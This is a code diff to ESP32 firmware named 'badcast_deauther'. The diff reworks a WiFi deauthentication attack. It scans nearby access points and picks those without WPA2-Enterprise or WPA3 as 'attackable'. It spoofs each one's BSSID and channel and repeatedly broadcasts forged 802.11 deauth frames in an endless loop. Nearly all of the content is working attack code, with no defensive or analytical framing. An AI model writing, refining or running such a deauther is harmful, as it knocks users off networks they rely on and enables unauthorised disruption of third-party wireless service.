@@ -3,7 +3,6 @@
 #include "freertos/task.h"
 #include "esp_mac.h"
 #include "esp_wifi.h"
-#include "esp_event.h"
 #include "esp_log.h"
 #include "esp_err.h"
 
@@ -16,6 +15,7 @@ static const char *TAG = "badcast_deauther";
  * 
  * Destination address is set to broadcast.
  * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
+ * Source: https://github.com/risinek/esp32-wifi-penetration-tool
  * 
  * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
  */
@@ -38,25 +38,36 @@ int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
     return 0;
 }
 
-void send_deauth_frame(const uint8_t bssid[6])
+typedef struct {
+    uint8_t bssid[6];                     /**< MAC address of AP */
+    uint8_t primary;                      /**< channel of AP */
+    wifi_second_chan_t second;            /**< secondary channel of AP */
+} ap_record;  // lite version of wifi_ap_record_t
+
+void send_deauth_frame(ap_record *target)
 {
+    // clone BSSID and channels first
+    ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_STA, target->bssid));
+    ESP_ERROR_CHECK(esp_wifi_set_channel(target->primary, target->second));
+
     uint8_t deauthFrame[sizeof(deauthFrameDefault)];
     memcpy(deauthFrame, deauthFrameDefault, sizeof(deauthFrameDefault));
-    memcpy(&deauthFrame[10], bssid, 6);
-    memcpy(&deauthFrame[16], bssid, 6);
+    memcpy(&deauthFrame[10], target->bssid, 6);
+    memcpy(&deauthFrame[16], target->bssid, 6);
 
-    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrameDefault), false);
-    if (ret) {
-        ESP_LOGW(TAG, "failed to send deauth frame, err: %d", ret);
-        return;
+    for (uint8_t i = 0; i < 5; i++) {
+        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrameDefault), false);
+        if (ret) {
+            ESP_LOGW(TAG, "failed to send deauth frame, err: %d", ret);
+            return;
+        }
     }
-    ESP_LOGI(TAG, "sent deauth frame as "MACSTR, MAC2STR(bssid));
+    ESP_LOGI(TAG, "sent deauth frames as "MACSTR, MAC2STR(target->bssid));
 }
 
 #define DEFAULT_SCAN_LIST_SIZE 6  // out of memory if > 6
-uint8_t macs[DEFAULT_SCAN_LIST_SIZE][6];
 
-uint16_t scan_ap()
+uint8_t scan_ap(ap_record *targets)
 {
     uint16_t number = DEFAULT_SCAN_LIST_SIZE;
     wifi_ap_record_t apInfo[DEFAULT_SCAN_LIST_SIZE];
@@ -70,8 +81,11 @@ uint16_t scan_ap()
 
     uint8_t attackableCount = 0;
     for (int i = 0; (i < DEFAULT_SCAN_LIST_SIZE) && (i < apCount); i++) {
-        if (apInfo[i].authmode == WIFI_AUTH_WPA3_PSK) continue;  // skip secured ones
-        memcpy(macs[attackableCount], apInfo[i].bssid, 6);
+        if (apInfo[i].authmode == WIFI_AUTH_WPA2_ENTERPRISE ||
+            apInfo[i].authmode == WIFI_AUTH_WPA3_PSK) continue;  // skip secured ones
+        memcpy(targets[attackableCount].bssid, apInfo[i].bssid, 6);
+        targets[attackableCount].primary = apInfo[i].primary;
+        targets[attackableCount].second = apInfo[i].second;
         attackableCount++;
     }
     ESP_LOGI(TAG, "attackable APs = %u / %u", attackableCount, apCount);
@@ -80,27 +94,20 @@ uint16_t scan_ap()
 
 void deauth(void *arg)
 {
-    uint8_t selfMac[6];
-    ESP_ERROR_CHECK(esp_wifi_get_mac(WIFI_IF_AP, selfMac));
-
     while (1) {
-        uint8_t apCount = scan_ap();
-        for (uint8_t i = 0; (i < DEFAULT_SCAN_LIST_SIZE) && (i < apCount); i++) {
-            ESP_ERROR_CHECK(esp_wifi_stop());
-            ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_AP, macs[i]));
-            ESP_ERROR_CHECK(esp_wifi_start());
-            ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(80));
-            ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));
+        // save AP channel
+        uint8_t chPrimary;
+        wifi_second_chan_t chSecond;
+        ESP_ERROR_CHECK(esp_wifi_get_channel(&chPrimary, &chSecond));
 
-            send_deauth_frame(macs[i]);
+        ap_record targets[DEFAULT_SCAN_LIST_SIZE];
+        uint8_t apCount = scan_ap(targets);
+        for (uint8_t i = 0; (i < DEFAULT_SCAN_LIST_SIZE) && (i < apCount); i++) {
+            send_deauth_frame(&targets[i]);
         }
 
-        // restore self AP mac
-        ESP_ERROR_CHECK(esp_wifi_stop());
-        ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_AP, selfMac));
-        ESP_ERROR_CHECK(esp_wifi_start());
-        ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(80));
-        ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));
+        // restore AP channel
+        ESP_ERROR_CHECK(esp_wifi_set_channel(chPrimary, chSecond));
 
         ESP_LOGI(TAG, "free heap: %u", esp_get_free_heap_size());
         vTaskDelay(10000 / portTICK_PERIOD_MS);
